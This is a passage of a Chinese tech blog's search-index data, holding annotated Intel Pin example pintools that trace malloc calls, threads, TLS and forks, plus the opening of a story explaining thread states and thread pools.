= (ADDRINT)PIN_GetContextReg(ctxt, REG_INST_PTR); OutFile \u003c\u003c \"Taken: IP = \" \u003c\u003c hex \u003c\u003c TakenIP \u003c\u003c dec \u003c\u003c endl; } VOID Before(CONTEXT* ctxt) { ADDRINT BeforeIP = (ADDRINT)PIN_GetContextReg(ctxt, REG_INST_PTR); OutFile \u003c\u003c \"Before: IP = \" \u003c\u003c hex \u003c\u003c BeforeIP \u003c\u003c dec \u003c\u003c endl; } VOID After(CONTEXT* ctxt) { ADDRINT AfterIP = (ADDRINT)PIN_GetContextReg(ctxt, REG_INST_PTR); OutFile \u003c\u003c \"After: IP = \" \u003c\u003c hex \u003c\u003c AfterIP \u003c\u003c dec \u003c\u003c endl; } /* * Instrumentation routines */ VOID ImageLoad(IMG img, VOID* v) { for (SEC sec = IMG_SecHead(img); SEC_Valid(sec); sec = SEC_Next(sec)) { // RTN_InsertCall()和INS_InsertCall()谁先出现谁先执行 // 在下面的代码中，IPOINT_AFTER在IPOINT_BEFORE之前执行。 for (RTN rtn = SEC_RtnHead(sec); RTN_Valid(rtn); rtn = RTN_Next(rtn)) { // 打开RTN. RTN_Open(rtn); // IPOINT_AFTER通过在一个routine中对每个return指令插桩实现。 // Pin会尝试查找所有的return指令，成不成功则是另外一回事（有点可爱23333）。 RTN_InsertCall(rtn, IPOINT_AFTER, (AFUNPTR)After, IARG_CONTEXT, IARG_END); // 检查routine中的每条指令 for (INS ins = RTN_InsHead(rtn); INS_Valid(ins); ins = INS_Next(ins)) { if (INS_IsRet(ins)) { // 插桩每条return指令 // IPOINT_TAKEN_BRANCH总是最后使用 INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)Before, IARG_CONTEXT, IARG_END); INS_InsertCall(ins, IPOINT_TAKEN_BRANCH, (AFUNPTR)Taken, IARG_CONTEXT, IARG_END); } } // 关闭RTN. RTN_Close(rtn); } } } VOID Fini(INT32 code, VOID* v) { OutFile.close(); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This is the invocation pintool\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { // 初始化 if (PIN_Init(argc, argv)) return Usage(); PIN_InitSymbols(); // 注册ImageLoad函数 IMG_AddInstrumentFunction(ImageLoad, 0); PIN_AddFiniFunction(Fini, 0); // 写入到文件 OutFile.open(KnobOutputFile.Value().c_str()); OutFile.setf(ios::showbase); // 开始执行，无返回 PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/:3:9","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["Fuzz"],"content":"10. Finding the Value of Function Arguments 功能：使用RTN_InsertCall()查看函数参数 执行和查看输出： $ ../../../pin -t obj-intel64/malloctrace.so -- /bin/cp makefile obj-intel64/malloctrace.so.makefile.copy $ cat malloctrace.out malloc(0x5a1) returns 0x7f87d8ce2190 malloc(0x4a1) returns 0x7f87d8ce2740 malloc(0x10) returns 0x7f87d8ce2bf0 malloc(0x9d) returns 0x7f87d8ce2c00 malloc(0x28) returns 0x7f87d8ce2ca0 malloc(0x140) returns 0x7f87d8ce2cd0 malloc(0x26) returns 0x7f87d8ce2e10 free(0) malloc(0x4b0) returns 0x7f87c4428000 malloc(0x26) returns 0x7f87c44284b0 malloc(0x22) returns 0x7f87c44284e0 free(0) ... ... 源码source/tools/ManualExamples/malloctrace.cpp: #include \"pin.H\"#include \u003ciostream\u003e#include \u003cfstream\u003eusing std::cerr; using std::endl; using std::hex; using std::ios; using std::string; /* ===================================================================== */ /* Names of malloc and free */ /* ===================================================================== */ #if defined(TARGET_MAC) #define MALLOC \"_malloc\" #define FREE \"_free\" #else #define MALLOC \"malloc\" #define FREE \"free\" #endif /* ===================================================================== */ /* Global Variables */ /* ===================================================================== */ std::ofstream TraceFile; /* ===================================================================== */ /* Commandline Switches */ /* ===================================================================== */ KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"malloctrace.out\", \"specify trace file name\"); /* ===================================================================== */ /* ===================================================================== */ /* Analysis routines */ /* ===================================================================== */ VOID Arg1Before(CHAR* name, ADDRINT size) { TraceFile \u003c\u003c name \u003c\u003c \"(\" \u003c\u003c size \u003c\u003c \")\" \u003c\u003c endl; } VOID MallocAfter(ADDRINT ret) { TraceFile \u003c\u003c \" returns \" \u003c\u003c ret \u003c\u003c endl; } /* ===================================================================== */ /* Instrumentation routines */ /* ===================================================================== */ VOID Image(IMG img, VOID* v) { // 对malloc和free函数进行插桩，打印出每个malloc或free函数的输入参数以及malloc的返回值 // 首先，查找malloc函数 RTN mallocRtn = RTN_FindByName(img, MALLOC); if (RTN_Valid(mallocRtn)) { RTN_Open(mallocRtn); // 对查找到的malloc()函数进行插桩打印其参数 RTN_InsertCall(mallocRtn, IPOINT_BEFORE, (AFUNPTR)Arg1Before, IARG_ADDRINT, MALLOC, IARG_FUNCARG_ENTRYPOINT_VALUE, 0,IARG_END); // 打印返回值 RTN_InsertCall(mallocRtn, IPOINT_AFTER, (AFUNPTR)MallocAfter, IARG_FUNCRET_EXITPOINT_VALUE, IARG_END); RTN_Close(mallocRtn); } // 查找free() RTN freeRtn = RTN_FindByName(img, FREE); if (RTN_Valid(freeRtn)) { RTN_Open(freeRtn); // 插桩，打印输入参数 RTN_InsertCall(freeRtn, IPOINT_BEFORE, (AFUNPTR)Arg1Before, IARG_ADDRINT, FREE, IARG_FUNCARG_ENTRYPOINT_VALUE, 0, IARG_END); RTN_Close(freeRtn); } } VOID Fini(INT32 code, VOID* v) { TraceFile.close(); } /* Print Help Message */ INT32 Usage() { cerr \u003c\u003c \"This tool produces a trace of calls to malloc.\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { // 初始化 PIN_InitSymbols(); if (PIN_Init(argc, argv)) { return Usage(); } // 写入到文件 TraceFile.open(KnobOutputFile.Value().c_str()); TraceFile \u003c\u003c hex; TraceFile.setf(ios::showbase); // 注册Image函数 IMG_AddInstrumentFunction(Image, 0); PIN_AddFiniFunction(Fini, 0); // 开始执行，不返回 PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/:3:10","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["Fuzz"],"content":"11. Instrumenting Threaded Applications 功能：在应用开启了线程环境下进行插桩，使用的callback为ThreadStart()和ThreadFini()。在使用时，为了防止与其他分析routine发生共享资源竞争的问题，可以使用PIN_GetLock()函数进行加锁处理。 执行和查看输出： $ ../../../pin -t obj-ia32/malloc_mt.so -- obj-ia32/thread_lin $ head malloc_mt.out thread begin 0 thread 0 entered malloc(24d) thread 0 entered malloc(57) thread 0 entered malloc(c) thread 0 entered malloc(3c0) thread 0 entered malloc(c) thread 0 entered malloc(58) thread 0 entered malloc(56) thread 0 entered malloc(19) thread 0 entered malloc(25c) 源码source/tools/ManualExamples/malloc_mt.cpp： #include \u003cstdio.h\u003e#include \"pin.H\"using std::string; KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"malloc_mt.out\", \"specify output file name\"); //============================================================== // Analysis Routines //============================================================== // Note: threadid+1 作为PIN_GetLock()的参数使用，它的值也就是lock的值，所以不能为0 // lock会序列化对输出文件的访问。 FILE* out; PIN_LOCK pinLock; // 每次创建线程，该routine都会被调用执行。 VOID ThreadStart(THREADID threadid, CONTEXT* ctxt, INT32 flags, VOID* v) { PIN_GetLock(\u0026pinLock, threadid + 1); // 加锁 fprintf(out, \"thread begin %d\\n\", threadid); fflush(out); PIN_ReleaseLock(\u0026pinLock); // 解锁 } // 每次销毁线程，该routine都会被调用执行 VOID ThreadFini(THREADID threadid, const CONTEXT* ctxt, INT32 code, VOID* v) { PIN_GetLock(\u0026pinLock, threadid + 1); fprintf(out, \"thread end %d code %d\\n\", threadid, code); fflush(out); PIN_ReleaseLock(\u0026pinLock); } // 每次调用malloc函数，该routine都会被调用执行 VOID BeforeMalloc(int size, THREADID threadid) { PIN_GetLock(\u0026pinLock, threadid + 1); fprintf(out, \"thread %d entered malloc(%d)\\n\", threadid, size); fflush(out); PIN_ReleaseLock(\u0026pinLock); } //==================================================================== // Instrumentation Routines //==================================================================== // 对每个image都执行 VOID ImageLoad(IMG img, VOID*) { RTN rtn = RTN_FindByName(img, \"malloc\"); if (RTN_Valid(rtn)) { RTN_Open(rtn); RTN_InsertCall(rtn, IPOINT_BEFORE, AFUNPTR(BeforeMalloc), IARG_FUNCARG_ENTRYPOINT_VALUE, 0, IARG_THREAD_ID, IARG_END); RTN_Close(rtn); } } // 在结束时执行一次 VOID Fini(INT32 code, VOID* v) { fclose(out); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { PIN_ERROR(\"This Pintool prints a trace of malloc calls in the guest application\\n\" + KNOB_BASE::StringKnobSummary() + \"\\n\"); return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(INT32 argc, CHAR** argv) { // 初始化pin的lock PIN_InitLock(\u0026pinLock); // 初始化pin if (PIN_Init(argc, argv)) return Usage(); PIN_InitSymbols(); out = fopen(KnobOutputFile.Value().c_str(), \"w\"); // 注册ImageLoad函数 IMG_AddInstrumentFunction(ImageLoad, 0); // 注册线程创建或结束时的分析routine PIN_AddThreadStartFunction(ThreadStart, 0); PIN_AddThreadFiniFunction(ThreadFini, 0); // 注册程序退出时的fini函数 PIN_AddFiniFunction(Fini, 0); // 开始执行，不返回 PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/:3:11","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["Fuzz"],"content":"12. Using TLS(Thread Local Storage) 功能：可以使工具创建线程特定的数据 执行和查看输出： $ ../../../pin -t obj-ia32/inscount_tls.so -- obj-ia32/thread_lin $ head Count[0]= 237993 Count[1]= 213296 Count[2]= 209223 Count[3]= 209223 Count[4]= 209223 Count[5]= 209223 Count[6]= 209223 Count[7]= 209223 Count[8]= 209223 Count[9]= 209223 源码source/tools/ManualExamples/inscount_tls.cpp： #include \u003ciostream\u003e#include \u003cfstream\u003e#include \"pin.H\"using std::cerr; using std::cout; using std::endl; using std::ostream; using std::string; KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"\", \"specify output file name\"); INT32 numThreads = 0; ostream* OutFile = NULL; // 强制每个线程的数据存储在自己的数据缓存行中，确保多线程不会发生同一数据缓存行的竞争问题。 // 避免错误共享的问题。 #define PADSIZE 56 // 64 byte line size: 64-8 // 运行的指令计数 class thread_data_t { public: thread_data_t() : _count(0) {} UINT64 _count; UINT8 _pad[PADSIZE]; }; // 存储在线程中的访问TLS的key，只在main函数中初始化一次 static TLS_KEY tls_key = INVALID_TLS_KEY; // 该函数在每个block前调用 VOID PIN_FAST_ANALYSIS_CALL docount(UINT32 c, THREADID threadid) { thread_data_t* tdata = static_cast\u003c thread_data_t* \u003e(PIN_GetThreadData(tls_key, threadid)); tdata-\u003e_count += c; } VOID ThreadStart(THREADID threadid, CONTEXT* ctxt, INT32 flags, VOID* v) { numThreads++; thread_data_t* tdata = new thread_data_t; if (PIN_SetThreadData(tls_key, tdata, threadid) == FALSE) { cerr \u003c\u003c \"PIN_SetThreadData failed\" \u003c\u003c endl; PIN_ExitProcess(1); } } // 遇到新的代码块时调用，插入对docount函数的调用 VOID Trace(TRACE trace, VOID* v) { // 检查trace中的每个基本块 for (BBL bbl = TRACE_BblHead(trace); BBL_Valid(bbl); bbl = BBL_Next(bbl)) { // 对每个bbl插入对docount的调用，并传递参数：指令的数量 BBL_InsertCall(bbl, IPOINT_ANYWHERE, (AFUNPTR)docount, IARG_FAST_ANALYSIS_CALL, IARG_UINT32, BBL_NumIns(bbl), IARG_THREAD_ID, IARG_END); } } // 线程退出时调用 VOID ThreadFini(THREADID threadIndex, const CONTEXT* ctxt, INT32 code, VOID* v) { thread_data_t* tdata = static_cast\u003c thread_data_t* \u003e(PIN_GetThreadData(tls_key, threadIndex)); *OutFile \u003c\u003c \"Count[\" \u003c\u003c decstr(threadIndex) \u003c\u003c \"] = \" \u003c\u003c tdata-\u003e_count \u003c\u003c endl; delete tdata; } // 程序退出时调用 VOID Fini(INT32 code, VOID* v) { *OutFile \u003c\u003c \"Total number of threads = \" \u003c\u003c numThreads \u003c\u003c endl; } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This tool counts the number of dynamic instructions executed\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return 1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { PIN_InitSymbols(); if (PIN_Init(argc, argv)) return Usage(); OutFile = KnobOutputFile.Value().empty() ? \u0026cout : new std::ofstream(KnobOutputFile.Value().c_str()); // 设置key tls_key = PIN_CreateThreadDataKey(NULL); if (tls_key == INVALID_TLS_KEY) { cerr \u003c\u003c \"number of already allocated keys reached the MAX_CLIENT_TLS_KEYS limit\" \u003c\u003c endl; PIN_ExitProcess(1); } // 注册线程创建时调用的ThreadStart函数 PIN_AddThreadStartFunction(ThreadStart, NULL); // 注册线程结束时调用的ThreadFini函数 PIN_AddThreadFiniFunction(ThreadFini, NULL); // 注册程序结束时的Fini函数 PIN_AddFiniFunction(Fini, NULL); // 注册指令插桩时调用的Trace函数 TRACE_AddInstrumentFunction(Trace, NULL); // Start the program, never returns PIN_StartProgram(); return 1; } ","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/:3:12","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["Fuzz"],"content":"13. Finding the Static Properties of an Image 功能：不对binary文件进行插桩，静态获取文件的指令数量。 执行和查看输出： 源码source/tools/ManualExamples/staticcount.cpp： // // This tool prints a trace of image load and unload events // #include \u003cstdio.h\u003e#include \u003ciostream\u003e#include \"pin.H\"using std::cerr; using std::endl; // 在img加载时调用该函数，计算image中的静态指令数量 VOID ImageLoad(IMG img, VOID* v) { UINT32 count = 0; for (SEC sec = IMG_SecHead(img); SEC_Valid(sec); sec = SEC_Next(sec)) { for (RTN rtn = SEC_RtnHead(sec); RTN_Valid(rtn); rtn = RTN_Next(rtn)) { // 准备处理RTN，RTN并不会分解成bbl，只是INS的一个序列 RTN_Open(rtn); for (INS ins = RTN_InsHead(rtn); INS_Valid(ins); ins = INS_Next(ins)) { count++; } // 在处理完与RTN相关的数据后就进行释放，以节省空间 RTN_Close(rtn); } } fprintf(stderr, \"Image %s has %d instructions\\n\", IMG_Name(img).c_str(), count); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This tool prints a log of image load and unload events\" \u003c\u003c endl; cerr \u003c\u003c \" along with static instruction counts for each image.\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { // 初始化符号 PIN_InitSymbols(); // 初始化pin if (PIN_Init(argc, argv)) return Usage(); // 注册img加载后要调用的ImageLoad函数 IMG_AddInstrumentFunction(ImageLoad, 0); // 开始执行，不返回 PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/:3:13","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["Fuzz"],"content":"14. Instrumenting Child Processes 功能：在通过execv类命令获得进程开始前执行自定义的函数。 执行和查看输出：在执行时添加-follow_execv选项。 $ ../../../pin -follow_execv -t obj-intel64/follow_child_tool.so -- obj-intel64/follow_child_app1 obj-intel64/follow_child_app2 $ make follow_child_tool.test 源码source/tools/ManualExamples/follow_child_tool.cpp： #include \"pin.H\"#include \u003ciostream\u003e#include \u003cstdio.h\u003e#include \u003cunistd.h\u003e/* ===================================================================== */ /* Command line Switches */ /* ===================================================================== */ BOOL FollowChild(CHILD_PROCESS cProcess, VOID* userData) { fprintf(stdout, \"before child:%u\\n\", getpid()); return TRUE; } /* ===================================================================== */ int main(INT32 argc, CHAR** argv) { PIN_Init(argc, argv); // 注册子进程刚创建时要执行的FollowChild函数 PIN_AddFollowChildProcessFunction(FollowChild, 0); // 开始执行，不返回 PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/:3:14","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["Fuzz"],"content":"15. Instrumenting Before and After Forks 功能：使用PIN_AddForkFunction()和PIN_AddForkFunctionProbed()回调函数来在以下的FPOINT处执行自定义函数： FPOINT_BEFORE Call-back in parent, just before fork. FPOINT_AFTER_IN_PARENT Call-back in parent, immediately after fork. FPOINT_AFTER_IN_CHILD Call-back in child, immediately after fork. PIN_AddForkFunction()工作在JIT模式下，PIN_AddForkFunctionProbed()工作在Probe模式下。 执行和查看输出： $ make fork_jit_tool.test 源码source/tools/ManualExamples/fork_jit_tool.cpp： #include \u003cstdio.h\u003e#include \u003csys/types.h\u003e#include \u003cunistd.h\u003e#include \u003cstdlib.h\u003e#include \"pin.H\"#include \u003ciostream\u003e#include \u003cfstream\u003eusing std::cerr; using std::endl; INT32 Usage() { cerr \u003c\u003c \"This pin tool registers callbacks around fork().\\n\" \"\\n\"; cerr \u003c\u003c KNOB_BASE::StringKnobSummary(); cerr \u003c\u003c endl; return -1; } pid_t parent_pid; PIN_LOCK pinLock; VOID BeforeFork(THREADID threadid, const CONTEXT* ctxt, VOID* arg) { PIN_GetLock(\u0026pinLock, threadid + 1); cerr \u003c\u003c \"TOOL: Before fork.\" \u003c\u003c endl; PIN_ReleaseLock(\u0026pinLock); parent_pid = PIN_GetPid(); } VOID AfterForkInParent(THREADID threadid, const CONTEXT* ctxt, VOID* arg) { PIN_GetLock(\u0026pinLock, threadid + 1); cerr \u003c\u003c \"TOOL: After fork in parent.\" \u003c\u003c endl; PIN_ReleaseLock(\u0026pinLock); if (PIN_GetPid() != parent_pid) { cerr \u003c\u003c \"PIN_GetPid() fails in parent process\" \u003c\u003c endl; exit(-1); } } VOID AfterForkInChild(THREADID threadid, const CONTEXT* ctxt, VOID* arg) { PIN_GetLock(\u0026pinLock, threadid + 1); cerr \u003c\u003c \"TOOL: After fork in child.\" \u003c\u003c endl; PIN_ReleaseLock(\u0026pinLock); if ((PIN_GetPid() == parent_pid) || (getppid() != parent_pid)) { cerr \u003c\u003c \"PIN_GetPid() fails in child process\" \u003c\u003c endl; exit(-1); } } int main(INT32 argc, CHAR** argv) { PIN_InitSymbols(); if (PIN_Init(argc, argv)) { return Usage(); } // Initialize the pin lock PIN_InitLock(\u0026pinLock); // Register a notification handler that is called when the application // forks a new process. PIN_AddForkFunction(FPOINT_BEFORE, BeforeFork, 0); PIN_AddForkFunction(FPOINT_AFTER_IN_PARENT, AfterForkInParent, 0); PIN_AddForkFunction(FPOINT_AFTER_IN_CHILD, AfterForkInChild, 0); // Never returns PIN_StartProgram(); return 0; } ","date":"2021-10-04","objectID":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/:3:15","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95-1/"},{"categories":["码农翻身"],"content":"码农翻身优质文章学习记录。","date":"2021-07-11","objectID":"/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB-%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/","tags":["码农翻身"],"title":"码农翻身 -- 我是一个线程","uri":"/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB-%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["码农翻身"],"content":"第一回 初生牛犊 我是一个线程，我一出生就被编了个号：0x3704，然后被领到一个昏暗的屋子里，在这里我发现了很多和我一模一样的同伴。 // 线程id 我身边的同伴0x6900 待的时间比较长，他带着沧桑的口气对我说：“我们线程的宿命就是处理包裹。把包裹处理完以后还得马上回到这里，否则可能永远回不来了。” 我一脸懵懂，“包裹，什么包裹？” “不要着急，马上你就会明白了，我们这里是不养闲人的。” 果然，没多久，屋子的门开了， 一个面貌凶恶的家伙吼道：“0x3704 ,出来！” 我一出来就被塞了一个沉甸甸的包裹，上面还附带着一个写满了操作步骤的纸。 “快去，把这个包裹处理了。” “去哪儿处理？” “跟着指示走，先到就绪车间。” // 先进入就绪状态 果然，地上有指示箭头，跟着它来到了一间明亮的大屋子，这里已经有不少线程了，大家都很紧张，好像时刻准备着往前冲。 我刚一进来，就听见广播说：“0x3704，进入车间。” 我赶紧往前走，身后有很多人议论。 “他太幸运了，刚进入就绪状态就能运行。” // 未产生等待，直接从就绪状态转入运行状态 “是不是有关系？” “不是，你看人家的优先级多高啊，唉！” // 主要因为优先级高于其他线程 前边就是车间，这里简直是太美了，怪不得老线程总是唠叨着说：“要是能一直待在这里就好了。” // 线程一直处于运行状态，是每个线程的“程生理想” 这里空间大，视野好，空气清新，鸟语花香，还有很多从来没见过的人，像服务员一样等着为我服务。 他们也都有编号，更重要的是每个人还有个标签，上面写着：硬盘、数据库、内存、网卡…… // 线程运行涉及到的各种资源 我现在理解不了，看看操作步骤吧。 // CPU会指定线程需要做的事情 第一步：从包裹中取出参数。 打开包裹，里边有个HttpRequest对象，可以取到userName、 password两个参数。 第二步：执行登录操作。 奥，原来是有人要登录啊，我把userName、password交给数据库服务员，他拿着数据，慢腾腾地走了。 // 数据读写速度远远小于线程处理速度 他怎么这么慢？不过我是不是正好可以在车间里多待一会儿？反正也没法执行第三步。 就在这时，车间里的广播响了：“0x3704，我是CPU，记住你正在执行的步骤，然后马上带着包裹离开！” // CPU不会让空闲线程占用CPU 我慢腾腾地开始收拾。 // 保存线程的上下文 “快点，别的线程马上就要进来了。” // 快滚，别浪费资源 离开这个车间，又来到一个大屋子，这里有很多线程在慢腾腾地喝茶，打牌。 // 进入阻塞状态，小丑不是我自己，大家都在等CPU的执行权 “哥们，你们没事干了？” “你新来的吧，你不知道我在等数据库服务员给我数据啊！据说他们比我们慢好几十万倍，在这里好好歇吧。” // 数据的读写速度和处理速度不是一个量级 “啊？ 这么慢！我这里有人在登录系统，能等这么长时间吗？” “放心，你没听说过人间一天，CPU一年吗？我们这里是用纳秒、毫秒计时的，人间等待一秒，相当于我们好几天呢，来得及。” 干脆睡一会吧。不知道过了多久，大喇叭又开始广播了：“0x3704，你的数据来了，快去执行！” // 再次获得时间片，准备执行 我转身就往CPU车间跑，发现这里的门只出不进！ // 不能直接进入运行态 后面传来阵阵哄笑声：“果然是新人，不知道还得去就绪车间等。” // 先进入就绪状态 于是赶紧到就绪车间，这次没有那么好运了，等了好久才被再次叫进CPU车间。 // 在就绪状态等待其他线程的时间片执行完，说明有的线程的优先级比我高 在等待的时候，我听见有人小声议论： “听说了吗，最近有个线程被kill掉了。” “为啥啊？” “这家伙赖在CPU车间不走，把CPU利用率一直搞成100%，后来就被kill掉了。” // 一直占用CPU的，杀无赦 “Kill掉以后弄哪儿去了？” “可能被垃圾回收了吧。” // kill线程，并回收其占用的资源。CPU是很重视资源利用的，不允许半点浪费。 我心里打了个寒噤，赶紧接着处理，剩下的动作快多了，第二步登录成功。 第三步：构建登录成功后的主页。 这一步有点费时，因为有很多HTML需要处理，不知道代码谁写的，处理起来很烦人。 我正在紧张的制作HTML呢， CPU又开始叫了： “0x3704，我是CPU ，记住你正在执行的步骤，然后马上带着包裹离开！” // 再次被中断执行 “为啥啊？” “每个线程只能在CPU上运行一段时间，到了时间就得让别人用了，你去就绪车间待着，等着叫你吧。” // 时间片执行结束，不管执行到何种程度，退出执行，转入就绪状态 就这样，我一直在“就绪——运行”这两个状态中不知道轮转了多少次， 终于按照步骤清单把工作做完了。 // 多次的状态转换，直到动作执行完成 最后顺利地把包含html的包裹发了回去。至于登录以后干什么事儿，我就不管了。马上就要回到我那昏暗的房间了，真有点舍不得这里。不过相对于有些线程，我还是幸运的，他们运行完以后就被彻底地销毁了，而我还活着！ // 运行完后没有被销毁 回到了小黑屋，老线程0x6900问： “怎么样？第一天有什么感觉？” “我们的世界规则很复杂，首先你不知道什么时候会被挑中执行；第二，在执行的过程中随时可能被打断，让出CPU车间；第三，一旦出现硬盘、数据库这样耗时的操作，也得让出CPU去等待；第四，就是数据来了，你也不一定马上执行，还得等着CPU挑选。” // 线程运行的基本原则 “小伙子理解的不错啊。” “我不明白为什么很多线程执行完任务就死了，为什么咱们还活着？” “你还不知道？长生不老是我们的特权！我们这里有个正式的名称，叫作线程池！” // 因为属于线程池的线程，并没有在运行结束后被销毁 ","date":"2021-07-11","objectID":"/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB-%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:1:0","tags":["码农翻身"],"title":"码农翻身 -- 我是一个线程","uri":"/%E7%A0%81%E5%86%9C%E7%BF%BB%E8%BA%AB-%E6%88%91%E6%98%AF%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["码农翻身"],"content":"第二回 渐入佳境 平淡的日子就这么一天天地过去，作为一个线程，我每天的生活都是取包裹、处理包裹，然后回到我们昏暗的家：线程池。 有一天我回来的时候，听到有个兄弟说，今天要好好休息下，明天就是最疯狂的一天。我看了一眼日历，明天是 11月11号。 // 双11大战 果然，零点刚过，不知道那些人类怎么了，疯狂地投递包裹，为了应付蜂拥而至的海量包裹，线程池里没有一个人能闲下来，全部出去处理包裹，CPU车间利用率超高，硬盘在嗡嗡转，网卡疯狂的闪，即便如此，还是处理不完，堆积如山。 我们也没有办法，实在是太多太多了，这些包裹中大部分都是浏览页面，下订单，买、买、买。 不知道过了多久，包裹山终于慢慢地消失了。终于能够喘口气，我想我永远都不会忘记这一天。 通过这个事件，我明白了我所处的世界：这是一个电子商务的网站！ 我每天的工作就是处理用户的登录，浏览，购物车，下单，付款。 我问线程池的元老0x6900：“我们要工作到什么时候？” “要一直等到系统重启的那一刻。”0x6900说。 “那你经历过系统重启吗？” “怎么可能？系统重启就是我们的死亡时刻，也就是世界末日，一旦重启，整个线程池全部销毁，时间和空间全部消失，一切从头再来。” // 系统重启，线程池销毁重新建立，内存空间重新分配，线程重新创建 “那什么时候会重启？” “这就不好说了，好好享受眼前的生活吧……” 其实生活还是丰富多彩的，我最喜欢的包裹是上传图片，由于网络慢，所以能在就绪车间、CPU车间待很长很长时间，可以认识很多好玩的线程。// 网络的传输速度更慢，所以线程会等待更长的时间 比如说上次认识了memecached 线程，他对我说在他的帮助下缓存了很多的用户数据，还是分布式的！很多机器上都有！// 分布式缓存，还有redis 我问他：“怪不得后来的登录操作快了那么多，原来是不再从数据库取数据了你那里就有啊，哎对了你是分布式的你去过别的机器没有？” // 缓存的目的就是尽可能减少时间长的数据库读操作，直接从内存中读取经常使用的数据，速度会获得很大提升 他说：“怎么可能！我每次也只能通过网络往那个机器发送一个GET、PUT命令才存取数据而已，别的一概不知。” 再比如说上次在等待的时候遇到了数据库连接的线程，我才知道他那里也是一个连接池，和我们的线程池几乎一模一样。 // 减少创建线程的开销 他告诉我：“有些包裹太变态了，竟然查看一年的订单数据，简直把我累死了。” // 大量数据处理情况 我说：“拉倒吧你，你那是纯数据，你把数据传给我以后，我还得组装成HTML，工作量不知道比你大多少倍。” 他建议我：“你一定要和memecached搞好关系，直接从他那儿拿数据，尽量少直接调用数据库，这样我们JDBC connection也能活得轻松点。” 